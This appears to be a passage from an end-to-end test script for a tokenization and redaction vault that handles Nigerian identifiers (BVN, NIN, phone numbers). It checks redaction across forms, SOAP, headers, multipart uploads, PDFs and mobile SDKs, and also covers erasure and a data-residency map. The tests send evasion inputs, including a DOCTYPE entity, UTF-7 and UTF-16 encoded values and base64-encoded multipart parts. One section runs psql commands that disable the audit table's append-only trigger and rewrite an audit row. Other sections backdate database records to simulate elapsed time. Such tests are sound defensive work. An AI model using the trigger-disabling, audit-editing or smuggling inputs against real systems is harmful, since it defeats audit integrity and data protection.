  check("a form's named and unnamed values are replaced, and others kept", r.status === 200 && !last().body.toString().includes(SECRET) && !last().body.toString().includes(PHONE2) && last().body.toString().includes("tier=gold") && last().body.toString().includes("tok_"), last()?.body.toString());
  check("the form stays a form", last().headers["content-type"] === FORM);
  sent.length = 0;
  check("a form that cannot be read does not pass", (await send(A, "/kyc", `note=%zz`, { "content-type": FORM })).status === 415 && sent.length === 0);

  const SOAP = (inner) => `<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" xmlns:k="urn:kyc"><s:Body>${inner}</s:Body></s:Envelope>`;
  r = await send(A, "/soap", SOAP(`<k:Check contact="${PHONE2}"><k:BVN>${SECRET}</k:BVN><k:Note>account ${ACCT}</k:Note><k:Tier>gold</k:Tier><!-- ${PHONE2} --></k:Check>`), { "content-type": "text/xml; charset=utf-8", soapaction: "urn:check" });
  const soapOut = last().body.toString();
  check("SOAP values are replaced in text, attributes and comments", r.status === 200 && !soapOut.includes(SECRET) && !soapOut.includes(PHONE2) && !soapOut.includes(ACCT), soapOut);
  check("the envelope, namespaces and other values arrive as sent", soapOut.startsWith('<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" xmlns:k="urn:kyc"><s:Body><k:Check') && soapOut.includes("<k:Tier>gold</k:Tier>"), soapOut);
  check("the SOAPAction header survives", last().headers.soapaction === "urn:check");
  sent.length = 0;
  check("a value hidden as UTF-16 or UTF-7 does not pass", (await send(C, "/t", Buffer.from(`bvn ${SECRET}`, "utf16le"), { "content-type": "text/plain" })).status === 415 && (await send(C, "/t", "x", { "content-type": "text/plain; charset=utf-7" })).status === 415 && sent.length === 0);
  check("a DOCTYPE does not pass", (await send(A, "/soap", `<!DOCTYPE a [<!ENTITY x "${SECRET}">]><a>&x;</a>`, { "content-type": "text/xml" })).status === 415 && sent.length === 0);

  r = await send(A, "/h?note=bvn+" + SECRET + "&reference=" + PHONE2 + "&page=2", "{}", { "content-type": "application/json", "x-customer-bvn": SECRET, "x-note": `call ${PHONE2}`, "x-allowed": PHONE2, authorization: "Bearer vendor-cred" });
  const hd = last().headers;
  check("a named header is tokenized, and detection covers the rest", r.status === 200 && hd["x-customer-bvn"].startsWith("tok_") && !hd["x-note"].includes(PHONE2), JSON.stringify(hd));
  check("an excluded header and a vendor's credentials pass as sent", hd["x-allowed"] === PHONE2 && hd.authorization === "Bearer vendor-cred");
  check("an unnamed query value is caught, an excluded one kept, others kept", !last().url.includes(SECRET) && last().url.includes(`reference=${PHONE2}`) && last().url.includes("page=2"), last().url);
  check("the route key does not reach the upstream", !hd["x-rv-route-key"]);

  sent.length = 0;
  check("a field rule refuses plain text", (await send(A, "/t", `please call ${PHONE2}`, { "content-type": "text/plain" })).status === 415 && sent.length === 0);
  r = await send(C, "/t", `please call ${PHONE2}`, { "content-type": "text/plain" });
  check("detection alone reads plain text", r.status === 200 && !last().body.toString().includes(PHONE2), last()?.body.toString());
  sent.length = 0;
  check("a compressed body does not pass", (await send(A, "/kyc", Buffer.from([0x1f, 0x8b, 8, 0]), { "content-type": FORM, "content-encoding": "gzip" })).status === 415 && sent.length === 0);
  r = await send(D, "/raw", Buffer.from([0x1f, 0x8b, 8, 0]), { "content-type": "application/zip" });
  check("a route with no rules and no detection passes anything", r.status === 200 && last().body[0] === 0x1f);

  const part = (name, filename, type, data) => [`--BOUND\r\nContent-Disposition: form-data; name="${name}"${filename ? `; filename="${filename}"` : ""}\r\n${type ? `Content-Type: ${type}\r\n` : ""}\r\n`, data, "\r\n"];
  const multi = (...ps) => Buffer.concat([...ps.flat().map((x) => Buffer.from(x)), Buffer.from("--BOUND--\r\n")]);
  const MP = "multipart/form-data; boundary=BOUND";
  r = await send(A, "/up", multi(part("bvn", null, null, SECRET), part("doc", `statement_${PHONE2}.csv`, "text/csv", `name,phone\nada,${PHONE2}\n`), part("tier", null, null, "gold")), { "content-type": MP });
  const mpOut = last().body.toString();
  check("multipart fields, text files and file names are checked", r.status === 200 && !mpOut.includes(SECRET) && !mpOut.includes(PHONE2) && mpOut.includes("name,phone") && mpOut.includes("gold"), mpOut);
  check("multipart keeps its boundary and quoted names", last().headers["content-type"] === MP && mpOut.includes('name="doc"'), mpOut.slice(0, 200));
  const PNG_HEADER = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0]);
  sent.length = 0;
  check("a binary file is refused by default", (await send(A, "/up", multi(part("id", "id.png", "image/png", PNG_HEADER)), { "content-type": MP })).status === 415 && sent.length === 0);
  check("a binary body is refused by default", (await send(A, "/up", PNG_HEADER, { "content-type": "application/octet-stream" })).status === 415 && sent.length === 0);
  check("base64 inside multipart does not pass", (await send(C, "/up", Buffer.from(`--BOUND\r\nContent-Disposition: form-data; name="a"\r\nContent-Transfer-Encoding: base64\r\n\r\nMjI=\r\n--BOUND--\r\n`), { "content-type": MP })).status === 415 && sent.length === 0);
  r = await send(C, "/up", multi(part("id", "id.png", "image/png", PNG_HEADER)), { "content-type": MP });
  check("an explicit pass sends the file, byte for byte", r.status === 200 && last().body.includes(PNG_HEADER));

  // A real file through the real redactor.
  const mkPdf = (lines) => {
    const text = lines.map((l, i) => `BT /F1 14 Tf 40 ${780 - i * 22} Td (${l}) Tj ET`).join("\n");
    const objs = ["<</Type/Catalog/Pages 2 0 R>>", "<</Type/Pages/Kids[3 0 R]/Count 1>>", "<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 842]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>", `<</Length ${text.length}>>stream\n${text}\nendstream`, "<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>"];
    let out = "%PDF-1.4\n"; const offs = [];
    objs.forEach((o, i) => { offs.push(out.length); out += `${i + 1} 0 obj${o}endobj\n`; });
    const xref = out.length;
    out += `xref\n0 ${objs.length + 1}\n0000000000 65535 f \n` + offs.map((o) => `${String(o).padStart(10, "0")} 00000 n \n`).join("") + `trailer<</Size ${objs.length + 1}/Root 1 0 R>>\nstartxref\n${xref}\n%%EOF\n`;
    return Buffer.from(out);
  };
  const pdf = mkPdf(["Customer statement", `BVN: ${SECRET}`, `Phone: ${PHONE2}`]);
  sent.length = 0;
  r = await send(B, "/up", multi(part("doc", "s.pdf", "application/pdf", pdf)), { "content-type": MP });
  const pdfOut = sent.at(-1)?.body;
  check("a PDF on a redacting route reaches the upstream cleaned, or not at all", (r.status === 200 && pdfOut && !pdfOut.includes(SECRET) && !pdfOut.includes(pdf)) || r.status === 415, `status ${r.status} ${await r.text().catch(() => "")}`);
  console.log(`        redacting route, multipart PDF: status ${r.status}, forwarded ${pdfOut?.length ?? 0} bytes`);
  sent.length = 0;
  r = await send(B, "/up", pdf, { "content-type": "application/pdf" });
  check("a whole-body PDF behaves the same", (r.status === 200 && sent.at(-1) && !sent.at(-1).body.includes(SECRET)) || r.status === 415, `status ${r.status}`);
  console.log(`        redacting route, whole PDF: status ${r.status}`);
  check("the file redactor's internal path is closed at the edge", (await fetch(`${BASE}/files/internal/redact/${V}`, { method: "POST", body: pdf })).status === 404);

  // Responses.
  const E = await mkRoute("Responses", { response_redact_paths: [{ path: "$.Envelope.Body.Result.BVN", field: "bvn" }], response_redact_headers: [{ header: "X-Result-BVN", field: "bvn" }], dlp: false });
  await sleep(6000);
  reply = { status: 200, type: "text/xml", body: SOAP(`<k:Result><k:BVN>${SECRET}</k:BVN></k:Result>`).replace("<k:Result>", "<k:Result>").replace(/k:Result/g, "Result").replace(/k:BVN/g, "BVN"), headers: { "x-result-bvn": SECRET } };
  r = await send(E, "/x", "{}", { "content-type": "application/json" });
  const rb = await r.text();
  check("an XML response is tokenized on the way back", r.status === 200 && !rb.includes(SECRET) && rb.includes("tok_"), rb);
  check("a response header is tokenized on the way back", !r.headers.get("x-result-bvn")?.includes(SECRET), r.headers.get("x-result-bvn"));
  reply = { status: 200, type: "application/octet-stream", body: PNG_HEADER, headers: {} };
  check("a binary response is refused where rules apply", (await send(E, "/x", "{}", { "content-type": "application/json" })).status === 415);
  reply = { status: 200, type: "application/json", body: "{}", headers: {} };
  up.close();
}

section("Mobile SDKs against this install");
{
  const APP = "rvapp://ng.e2e.wallet";
  const { createClient, VaultError: RnError } = await import(`${process.env.RV_E2E_RN}`);
  check("an app id with a path is refused", (await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: ["rvapp://x/y"] } })).status === 400);
  check("an app is listed like a site", (await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: [APP] } })).status === 200);
  const pol = await control("/v1/policies", { token: ADMIN, body: { name: "mobile-reveal", source: { rules: [{ id: "acct", actions: ["detokenize"], who: { roles: ["backend_service"] }, what: { data_types: ["nuban"] }, when: { purpose_required: true }, returns: "plaintext" }] } } });
  await control(`/v1/policies/${pol.json.id}/publish`, { token: BOLA, method: "POST" });
  await sleep(6000);
  const frameCsp = (await fetch(`${BASE}/embed/frame/${V}`)).headers.get("content-security-policy") ?? "";
  check("an app's name never reaches a frame's allowed parents", !frameCsp.includes("rvapp") && frameCsp.includes("frame-ancestors 'none'"), frameCsp);
  const sa = await sdk.bearer();
  const mint = async (b) => { const r = await req(`/v1/vaults/${V}/client-tokens`, { token: sa, body: { origin: APP, ...b } }); if (!r.json?.client_token) throw new Error(`mint: ${r.text}`); return r.json.client_token; };
  const REVEAL_ACCOUNT = "0456789013";
  const [acct] = await sdk.tokenize(V, [{ field: "account_number", value: REVEAL_ACCOUNT }]).catch(async () => sdk.tokenize(V, [{ field: "nuban", value: REVEAL_ACCOUNT }]));
  const acctToken = acct.token;
  check("a token exists to reveal", Boolean(acctToken), JSON.stringify(acct));
  const collectFor = (v) => mint({ kind: "collect", fields: ["bvn"], subject_ref: `cust_mobile_${v}` });
  const revealOf = (token) => mint({ kind: "reveal", tokens: [token], purpose: "mobile test" });

  // React Native's client, the same code an app runs, in Node.
  const rn = createClient({ baseUrl: BASE, appOrigin: APP });
  const rnOther = createClient({ baseUrl: BASE, appOrigin: "rvapp://ng.other.app" });
  const code = (e) => (e instanceof RnError ? e.code : String(e));
  const RN_VALUE = "22777766651";
  const c1 = await collectFor("rn");
  check("React Native: describe names the field", (await rn.describe(c1)).fields[0]?.name === "bvn");
  check("React Native: another app's name is refused", await rnOther.describe(c1).then(() => false, (e) => code(e) === "invalid_client_token"));
  const typo = await rn.collect(c1, { bvn: "nope" }).catch((e) => e);
  check("React Native: a typo names the field, and keeps the token", typo.code === "validation_failed" && typo.fields[0] === "bvn" && !JSON.stringify(typo).includes("nope"), JSON.stringify(typo));
  const rnTokens = await rn.collect(c1, { bvn: RN_VALUE });
  check("React Native: collect returns a token", rnTokens.bvn?.startsWith("tok_bvn_") && !rnTokens.bvn.includes(RN_VALUE), JSON.stringify(rnTokens));
  check("React Native: a client token works once", await rn.collect(c1, { bvn: RN_VALUE }).then(() => false, (e) => code(e) === "invalid_client_token"));
  const shown = await rn.reveal(await revealOf(acctToken));
  check("React Native: reveal returns what policy allows", shown[0]?.value === REVEAL_ACCOUNT, JSON.stringify(shown));
  const refused = await rn.reveal(await revealOf(rnTokens.bvn));
  check("React Native: reveal holds nothing when policy refuses", refused[0]?.value === undefined && refused[0]?.error?.code === "policy_denied", JSON.stringify(refused));

  // Swift, compiled and run on this Mac. The SDK's logic is the same on iOS; iOS itself is not run here.
  const SWIFT_VALUE = "22777766652";
  const swift = () => execSync(`swift run --package-path ${process.env.RV_E2E_IOS} rv-ios-check`, { encoding: "utf8", maxBuffer: 1 << 24, stdio: ["ignore", "pipe", "pipe"], env: { ...process.env, RV_BASE: BASE, RV_APP_ORIGIN: APP, RV_VALUE: SWIFT_VALUE, ...swiftEnv } });
  const swiftEnv = { RV_COLLECT_TOKEN: await collectFor("swift"), RV_REVEAL_TOKEN: await revealOf(acctToken), RV_REVEAL_VALUE: REVEAL_ACCOUNT, RV_DENIED_TOKEN: await revealOf(rnTokens.bvn) };
  let swiftOut = "";
  let swiftOk = true;
  try { swiftOut = swift(); } catch (e) { swiftOut = `${e.stdout ?? ""}\n${e.stderr ?? ""}`; swiftOk = false; }
  for (const line of swiftOut.split("\n").filter((l) => /^\s+(ok|FAIL)\s/.test(l))) check(line.replace(/^\s+(ok|FAIL)\s+/, ""), /^\s+ok/.test(line));
  check("the Swift check ran to its end", swiftOk && swiftOut.includes("RV_TOKEN=tok_bvn_"), swiftOut.slice(-500));
  check("no typed value is in an error from Swift", !swiftOut.includes("nope"));

  // Android runs on an emulator only when one is asked for, since most machines do not have one.
  if (process.env.RV_E2E_ANDROID === "1") {
    const ANDROID_VALUE = "22777766653";
    // Only while this section runs, on a small allowance, with services it does not need stopped:
    // an emulator on top of the whole stack and its benchmarks overloads a laptop.
    const SDK = process.env.ANDROID_HOME, ADB = `"${SDK}/platform-tools/adb" -s emulator-5554`;
    const IDLE = "log-processor ai-gateway http-proxy adapters file-redactor console";
    sh(`${COMPOSE} stop ${IDLE}`);
    const emulator = spawn(`${SDK}/emulator/emulator`, ["-avd", process.env.RV_E2E_AVD ?? "rv_sdk_test", "-no-window", "-no-audio", "-no-boot-anim", "-no-snapshot-save", "-gpu", "swiftshader_indirect", "-memory", "2048", "-cores", "2"], { stdio: "ignore", detached: true });
    let out = "", ok = true, booted = false;
    try {
      for (let i = 0; i < 90 && !booted; i++) { await sleep(4000); try { booted = sh(`${ADB} shell getprop sys.boot_completed`).trim() === "1"; } catch { /* still starting */ } }
      if (!booted) throw Object.assign(new Error("boot"), { stdout: "the emulator did not boot in 6 minutes" });
      sh(`${ADB} reverse tcp:8443 tcp:8443`);
      // Builds first, so that the tokens are minted as close to the run as they can be.
      execSync(`./gradlew --no-daemon --max-workers=2 assembleDebugAndroidTest`, { cwd: process.env.RV_E2E_ANDROID_DIR, encoding: "utf8", maxBuffer: 1 << 26, stdio: ["ignore", "pipe", "pipe"], timeout: 480000 });
      const fresh = { rvBase: "https://localhost:8443", rvOrigin: APP, rvValue: ANDROID_VALUE, rvRevealValue: REVEAL_ACCOUNT, rvCollect: await collectFor("android"), rvReveal: await revealOf(acctToken), rvDenied: await revealOf(rnTokens.bvn) };
      const flags = Object.entries(fresh).map(([k, v]) => `-Pandroid.testInstrumentationRunnerArguments.${k}='${v}'`).join(" ");
      out = execSync(`./gradlew --no-daemon --max-workers=2 connectedDebugAndroidTest ${flags}`, { cwd: process.env.RV_E2E_ANDROID_DIR, encoding: "utf8", maxBuffer: 1 << 26, stdio: ["ignore", "pipe", "pipe"], timeout: 480000, env: { ...process.env, ANDROID_SERIAL: "emulator-5554" } });
    } catch (e) { out = `${e.stdout ?? ""}\n${e.stderr ?? ""}`; ok = false; }
    try { sh(`${ADB} emu kill`); } catch { try { process.kill(-emulator.pid); } catch { /* already gone */ } }
    await sleep(4000);
    try { sh(`"${SDK}/platform-tools/adb" kill-server`); } catch { /* not running */ }
    sh(`${COMPOSE} start ${IDLE}`);
    check("Android: collect and reveal pass on an emulator against this install", ok && out.includes("BUILD SUCCESSFUL"), out.slice(-1500));
  } else {
    console.log("        Android emulator test not requested: set RV_E2E_ANDROID=1");
  }

  await control(`/v1/policies/${pol.json.id}/archive`, { token: ADMIN, method: "POST" });
  await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: [] } });
  await sleep(6000);
  check("removing an app from the list stops its tokens", await rn.describe(await (async () => { await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: [APP] } }); await sleep(6000); const t = await collectFor("gone"); await control(`/v1/vaults/${V}/embed`, { token: ADMIN, method: "PATCH", body: { origins: [] } }); await sleep(6000); return t; })()).then(() => false, (e) => code(e) === "invalid_client_token"));
}

section("Plaintext sweep: database dump and every service log");
const dump = sh(`${COMPOSE} exec -T postgres pg_dump -U rv rv`);
check("the dump has real content", dump.length > 10000 && dump.includes("audit_events"));
for (const [label, s] of Object.entries({ BVN, NIN, NUBAN, PHONE, "phone normalised": "+2348039998877", "name (lower-cased)": NAME.toLowerCase(), EMAIL, "subject ref": "cust_e2e_1", "component subject ref": "cust_embed_1", "mobile values": "2277776665", "webhook secret": WEBHOOK_SECRET, "custom loan id": LOAN, "custom PIN": PIN_VALUE, "custom list value": VIP, "custom test sample": SAMPLE_SECRET, "component value": EMBED_VALUE })) {
  check(`${label} is absent from the database dump`, !dump.includes(s));
}
const logs = sh(`${COMPOSE} logs --no-color`);
check("the logs have real content", logs.length > 1000);
for (const [label, s] of Object.entries({ BVN, NIN, NUBAN, PHONE, EMAIL, FRESH, "user password": boot.password, "webhook secret": WEBHOOK_SECRET, "webhook receiver key": "keep-me-quiet", "pipeline key": KEY, "custom loan id": LOAN, "custom PIN": PIN_VALUE, "custom list value": VIP, "custom test sample": SAMPLE_SECRET, "component value": EMBED_VALUE })) {
  check(`${label} is absent from all service logs`, !logs.includes(s));
}

section("Tamper evidence on the live database");
const psql = (q) => sh(`${COMPOSE} exec -T postgres psql -U rv rv -c "${q}"`);
psql("ALTER TABLE events.audit_events DISABLE TRIGGER audit_append_only");
psql("UPDATE events.audit_events SET purpose='nothing to see' WHERE purpose='spoof-check'");
const broken = await control("/v1/audit-events/verify", { token: ADMIN, method: "POST" });
check("editing one audit row breaks verification", broken.json.ok === false && broken.json.first_broken_seq > 0, broken.text);
psql("UPDATE events.audit_events SET purpose='spoof-check' WHERE purpose='nothing to see'");
psql("ALTER TABLE events.audit_events ENABLE TRIGGER audit_append_only");
check("restoring it verifies again", (await control("/v1/audit-events/verify", { token: ADMIN, method: "POST" })).json.ok === true);

section("Erasure");
const erased = await req(`/v1/vaults/${V}/subjects/${SID}`, { method: "DELETE", token: ADMIN, headers: { "x-rv-purpose": "NDPA erasure 1" } });
check("erasure deletes the values", erased.status === 200 && erased.json.erased_records >= 5, erased.text);
const gone = await reveal(ADMIN, [T.bvn]);
check("an erased token no longer resolves", gone.json.results[0].error?.code === "token_not_found", gone.text);

section("Operator tools");
let doctor = "";
try { doctor = sh("./rv doctor"); } catch (e) { doctor = `${e.stdout}${e.stderr}`; }
console.log(doctor.split("\n").map((l) => `        ${l}`).join("\n"));
check("rv doctor passes", doctor.includes("All checks passed"));
const lic = await control("/v1/settings", { token: ADMIN });
check("the licence verifies offline", lic.json.licence?.valid === true && lic.json.licence.customer === "E2E Test Bank", lic.text);

section("Residency map (Update Spec 02)");
{
  const until = async (fn, ms = 60000) => { const t0 = Date.now(); for (;;) { const v = await fn(); if (v) return v; if (Date.now() - t0 > ms) return null; await sleep(500); } };
  const db = (q) => sh(`${COMPOSE} exec -T postgres psql -U rv rv -At -c "${q}"`).trim();
  const flow = async (id) => (await control(`/v1/map/flows/${id}`, { token: ADMIN })).json;
  const statusIs = (id, s, ms) => until(async () => { const f = await flow(id); return f.status === s ? f : null; }, ms);
  const timeline = async (id) => (await control(`/v1/map/flows/${id}/timeline`, { token: ADMIN })).json;

  const off = await control(`/v1/map/flows?vault_id=${V}`, { token: ADMIN });
  check("the map is off by default: no flows are listed", off.status === 200 && off.json.total === 0, off.text);
  const refused = await control("/v1/map/systems", { token: ADMIN, body: { vault_id: V, name: "Too soon", kind: "database" } });
  check("the map refuses changes while off", refused.status === 403 && refused.json.error.code === "feature_disabled", refused.text);
  check("a support agent cannot read the map", (await control("/v1/map/flows", { token: sade.token })).status === 403);
  check("only an admin can turn it on", (await control("/v1/map/settings", { token: sade.token, method: "PATCH", body: { vault_id: V, enabled: true } })).status === 403);
  const mapOn = await control("/v1/map/settings", { token: ADMIN, method: "PATCH", body: { vault_id: V, enabled: true } });
  check("turning it on works", mapOn.status === 200, `${mapOn.status} ${mapOn.text}`);

  const vendors = (await control("/v1/map/vendors", { token: ADMIN })).json.vendors;
  check("the catalogue is seeded with 40 or more vendors", vendors.filter((v) => !v.custom).length >= 40, String(vendors.length));
  check("catalogue search finds by hostname", (await control("/v1/map/vendors?q=datadoghq", { token: ADMIN })).json.vendors.some((v) => v.name === "Datadog"));
  const ven = await control("/v1/map/vendors", { token: ADMIN, body: { name: "E2E Logs", category: "logging", hostnames: ["host.docker.internal"], regions: [{ code: "ie", name: "Ireland", country: "IE" }, { code: "lagos", name: "Lagos", country: "NG" }] } });
  check("a custom vendor can be added", ven.status === 201, ven.text);
  check("a duplicate vendor is refused", (await control("/v1/map/vendors", { token: ADMIN, body: { name: "e2e logs", hostnames: ["x.example"] } })).status === 409);

  const sink = http.createServer((q, s) => { q.resume(); q.on("end", () => { s.writeHead(200); s.end("{}"); }); });
  await new Promise((r) => sink.listen(18890, "0.0.0.0", r));
  const mp = await control("/v1/log-pipelines", { token: ADMIN, body: { vault_id: V, name: "Map logs", source_type: "otlp", destination: "E2E Logs", upstream_url: "http://host.docker.internal:18890" } });
  const MP = mp.json.id, MK = mp.json.ingest_key;
  await sleep(6000);
  const mapLine = (extra = "") => ({ resourceLogs: [{ resource: { attributes: [] }, scopeLogs: [{ logRecords: [{ body: { stringValue: `map check bvn=${BVN} ${extra}` } }] }] }] });
  const sendMap = () => req(`/logs/otlp/${MP}/v1/logs`, { body: mapLine(), headers: { "x-rv-pipeline-key": MK } });
  const t0 = Date.now();
  check("traffic through the new pipeline is accepted", (await sendMap()).status === 200);
  const seen = await until(async () => (await control(`/v1/map/flows?vault_id=${V}&q=Map logs`, { token: ADMIN })).json.flows[0], 280000);
  check(`criterion 1: a new pipeline to an unconfirmed host appears within 5 minutes (${Math.round((Date.now() - t0) / 1000)} s)`, !!seen && seen.origin === "observed");
  const F = seen?.id;
  check("it matched the catalogue, by host", seen?.dest.vendor === "E2E Logs" && seen?.dest.host === "host.docker.internal", JSON.stringify(seen?.dest));
  check("an unconfirmed region is treated as offshore: no country, and flagged", seen?.dest_country === null && seen?.region_unconfirmed === true);
  const alertSeen = await until(async () => (await control("/v1/map/alerts", { token: ADMIN })).json.alerts.find((a) => a.kind === "map_new_offshore_flow" && a.detail.flow_id === F));
  check("a new offshore flow raises an alert, naming no value", !!alertSeen && !JSON.stringify(alertSeen).includes(BVN));
  check("the system page offers the region to confirm", (await flow(F)).fix?.kind === "confirm_region");
  check("detections carry their destination host, and get stamped with the flow", !!(await until(() => db(`SELECT count(*) FROM events.detection_events WHERE source_id='${MP}' AND dest_host='host.docker.internal' AND flow_id='${F}'`) !== "0")));
  const st0 = await statusIs(F, "shadow");
  check("criterion 2: a route in shadow shows shadow", !!st0);
  check("the fix after a region is confirmed is to switch the route", (await control(`/v1/map/systems/${seen.dest.system_id}/confirm-region`, { token: ADMIN, body: { region: "ie" } })).status === 200 && (await flow(F)).fix?.kind === "enforce");
  const conf = await flow(F);
  check("a confirmed region resolves the country", conf.dest_country === "IE" && conf.dest_country_source === "vendor_region", JSON.stringify([conf.dest_country, conf.dest_country_source]));
  check("an unknown region is refused", (await control(`/v1/map/systems/${seen.dest.system_id}/confirm-region`, { token: ADMIN, body: { region: "mars" } })).status === 400);

  // Criterion 4: no route sets a status.
  for (const [what, p, method, body] of [["a flow edit", `/v1/map/flows/${F}`, "PATCH", { status: "protected" }], ["declaring a flow", "/v1/map/flows", "POST", { source_system_id: seen.source.id, dest_host: "x.example", status: "verified" }], ["a bulk edit", "/v1/map/flows/bulk", "POST", { ids: [F], status: "protected" }]]) {
    const r = await control(p, { token: ADMIN, method, body });
    check(`criterion 4: ${what} cannot set a status`, r.status === 422 && r.json.error.code === "status_read_only", r.text);
  }
  check("criterion 4: an unknown field in a flow edit is refused", (await control(`/v1/map/flows/${F}`, { token: ADMIN, method: "PATCH", body: { from_status: "x" } })).status === 400);
  check("criterion 4: the status event log cannot be changed by the control role", /permission denied/.test((() => { try { return db(`SET ROLE rv_control; UPDATE control.flow_status_events SET cause='x'`); } catch (e) { return String(e.stderr ?? e); } })()));
  check("the status is unchanged by all that", (await flow(F)).status === "shadow");

  // Criterion 2: enforcing, then seven clean days.
  check("switching the route to enforcing works", (await control(`/v1/log-pipelines/${MP}`, { token: ADMIN, method: "PATCH", body: { mode: "enforcing" } })).status === 200);
  const proving = await flow(F);
  check("just after the switch it is still amber, and says it is proving a clean week", proving.status === "shadow" && proving.proving?.day === 1, JSON.stringify([proving.status, proving.proving]));
  await sleep(6000);
  check("enforcing traffic is forwarded", (await sendMap()).status === 200);
  check("passes from before the switch do not count as a leak", !(await statusIs(F, "leaking", 8000)));
  // Seven days pass: the switch and the earlier watch-only counts move back eight.
  db(`UPDATE control.systems SET route_mode_since=now()-interval '8 days' WHERE source_ref->>'id'='${MP}'; UPDATE events.detection_events SET occurred_at=occurred_at-interval '8 days' WHERE source_id='${MP}' AND action IN ('shadow','passed')`);
  const prot = await statusIs(F, "protected");
  check("criterion 2: enforcing for 7 days with nothing unprotected moves it to protected", !!prot);
  check("green is explained by cause", (await timeline(F)).events[0]?.cause === "no_leak_7d", JSON.stringify((await timeline(F)).events[0]));
  const ver0 = (await timeline(F)).events[0].evidence;
  check("the evidence snapshot has counts, rule set and route mode", ver0.route_mode === "enforcing" && ver0.unprotected_7d === 0 && "ruleset_version" in ver0, JSON.stringify(ver0));

  // Thirty days protected.
  db(`UPDATE control.data_flows SET status_since=now()-interval '31 days' WHERE id='${F}'`);
  check("protected for 30 days becomes verified", !!(await statusIs(F, "verified")));
  check("verified is explained by cause", (await timeline(F)).events[0]?.cause === "verified_30d");

  // Criterion 3: one pass and it is leaking again.
  check("an entity can be left on pass and count", (await control(`/v1/log-pipelines/${MP}`, { token: ADMIN, method: "PATCH", body: { action_per_type: { bvn: "pass" } } })).status === 200);
  await sleep(6000);
  await sendMap();
  const leak = await statusIs(F, "leaking");
  check("criterion 3: one unprotected detection on a verified flow moves it to leaking", !!leak);
  const lev = (await timeline(F)).events[0];
  check("the leak is logged with its cause and counts, and no grace", lev?.cause === "detections_passed" && lev?.from_status === "verified" && lev?.evidence.unprotected_7d > 0, JSON.stringify(lev));
  check("a leak raises an alert", !!(await until(async () => (await control("/v1/map/alerts", { token: ADMIN })).json.alerts.find((a) => a.kind === "map_flow_leaking" && a.detail.flow_id === F))));
  check("the fix names what passed", (await flow(F)).fix?.kind === "entity_action" && (await flow(F)).fix?.entities.includes("bvn"), JSON.stringify((await flow(F)).fix));
  check("the flow's data shows protected and passed by type", (await until(async () => (await flow(F)).by_entity.some((e) => e.entity_type === "bvn" && e.passed > 0))) === true);
  await control(`/v1/log-pipelines/${MP}`, { token: ADMIN, method: "PATCH", body: { action_per_type: {} } });
  db(`UPDATE events.detection_events SET occurred_at=occurred_at-interval '8 days' WHERE source_id='${MP}' AND action='passed'`);
  const back = await statusIs(F, "protected");
  check("criterion 3: the 30-day clock restarts: after the leak clears it is protected, not verified", !!back);

  // Manual flows, and the example in the spec.
  const sys = await control("/v1/map/systems", { token: ADMIN, body: { vault_id: V, name: "Core ledger", kind: "database", hosting_country: "NG", hosting_facility: "Rack Centre", entity_types: ["bvn", "nuban"], owner_id: me0.id } });
  check("a system can be declared", sys.status === 201, sys.text);
  const SYS = sys.json.id;
  const snow = vendors.find((v) => v.name === "Snowflake");
  const mf = await control("/v1/map/flows", { token: ADMIN, body: { source_system_id: SYS, dest_vendor_id: snow.id, dest_region: "aws-eu-west-1", entity_types: ["bvn", "nuban", "amount_ngn"], in_cbn_scope: true, owner_id: me0.id } });
  check("the spec's example: declared to Snowflake in Ireland is leaking", mf.status === 201 && mf.json.status === "leaking" && mf.json.dest_country === "IE" && mf.json.dest_country_source === "vendor_region", mf.text);
  check("criterion 8: a declared flow is labelled declared", mf.json.basis === "declared");
  const dup = await control("/v1/map/flows", { token: ADMIN, body: { source_system_id: SYS, dest_vendor_id: snow.id, dest_region: "aws-eu-west-1", entity_types: ["bvn"] } });
  check("the same source, destination and region is flow_exists", dup.status === 409 && dup.json.error.code === "flow_exists", dup.text);
  check("a region the vendor does not have is refused", (await control("/v1/map/flows", { token: ADMIN, body: { source_system_id: SYS, dest_vendor_id: snow.id, dest_region: "nope" } })).status === 400);
  const unv = await control("/v1/map/flows", { token: ADMIN, body: { source_system_id: SYS, dest_host: "unknown.partner.example", entity_types: ["bvn"] } });
  check("hosting not declared is unverified", unv.status === 201 && unv.json.status === "unverified", unv.text);
  const ng = await control("/v1/map/flows", { token: ADMIN, body: { source_system_id: SYS, dest_host: "dr.lagos.example", dest_country: "NG", entity_types: ["bvn"] } });
  check("declared in Nigeria is in_country, and labelled declared", ng.status === 201 && ng.json.status === "in_country" && ng.json.basis === "declared", ng.text);
  const MF = mf.json.id;

  // Criterion 5: exceptions.
  const tooLong = await control(`/v1/map/flows/${MF}/exceptions`, { token: ADMIN, body: { reason: "Migration under way", expires_at: "2099-01-01" } });
  check("an exception past the maximum is expiry_too_long", tooLong.status === 422 && tooLong.json.error.code === "expiry_too_long", tooLong.text);
  const soon = new Date(Date.now() + 10 * 86400000).toISOString().slice(0, 10);
  const ex = await control(`/v1/map/flows/${MF}/exceptions`, { token: ADMIN, body: { reason: `Vendor contract ends soon, BVN ${BVN} was an example`, compensating_controls: "Weekly review", expires_at: soon } });
  check("an exception can be requested", ex.status === 201 && ex.json.status === "pending", ex.text);
  check("identifiers typed into a reason are removed", !db(`SELECT reason FROM control.flow_exceptions WHERE id='${ex.json.id}'`).includes(BVN));
  check("a pending exception changes nothing", (await flow(MF)).status === "leaking");
  check("a second live exception is refused", (await control(`/v1/map/flows/${MF}/exceptions`, { token: ADMIN, body: { reason: "Another one here", expires_at: soon } })).status === 409);
  const self = await control(`/v1/map/exceptions/${ex.json.id}/approve`, { token: ADMIN, method: "POST" });
  check("criterion 5: the requester cannot approve", self.status === 403 && self.json.error.code === "approval_required", self.text);
